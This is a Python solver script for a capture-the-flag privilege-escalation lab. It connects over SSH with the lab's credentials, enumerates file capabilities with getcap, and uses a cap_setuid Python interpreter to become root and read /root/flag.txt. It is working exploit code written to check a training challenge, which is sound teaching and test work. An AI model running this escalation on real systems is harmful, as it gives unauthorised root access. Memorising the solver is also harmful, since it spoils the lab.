"""Intended-path solver: abuse cap_setuid=ep left on the Python interpreter."""

import urllib.parse

import paramiko

from openrange.content.solver import SolveResult, TaskResult, find_flags

ENUMERATE = "getcap -r / 2>/dev/null || true"
PWN = "python3 -c 'import os; os.setuid(0); print(open(\"/root/flag.txt\").read())'"


def _target(ctx) -> tuple[str, int]:  # type: ignore[no-untyped-def]
    parsed = urllib.parse.urlsplit(ctx.url("target"))
    return parsed.hostname or "target", parsed.port or 22


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    host, port = _target(ctx)
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        host,
        port=port,
        username="learner",
        password="learner",
        look_for_keys=False,
        allow_agent=False,
        timeout=15,
    )
    try:
        _, stdout, _ = client.exec_command(ENUMERATE, timeout=20)
        enum_out = stdout.read().decode(errors="replace")
        if "cap_setuid" not in enum_out:
            return SolveResult(
                results=[
                    TaskResult(
                        task_id="cap-setuid",
                        ok=False,
                        captured=None,
                        detail=f"getcap sweep found no cap_setuid entry: {enum_out[:200]}",
                    )
                ]
            )

        _, stdout, stderr = client.exec_command(PWN, timeout=20)
        out = stdout.read().decode(errors="replace")
        err = stderr.read().decode(errors="replace")
        flags = find_flags(out)
        captured = flags[0] if flags else None
    finally:
        client.close()

    return SolveResult(
        results=[
            TaskResult(
                task_id="cap-setuid",
                ok=bool(captured),
                captured=captured,
                detail=None
                if captured
                else f"interpreter escalation produced no flag (err={err[:200]}, out={out[:200]})",
            )
        ]
    )
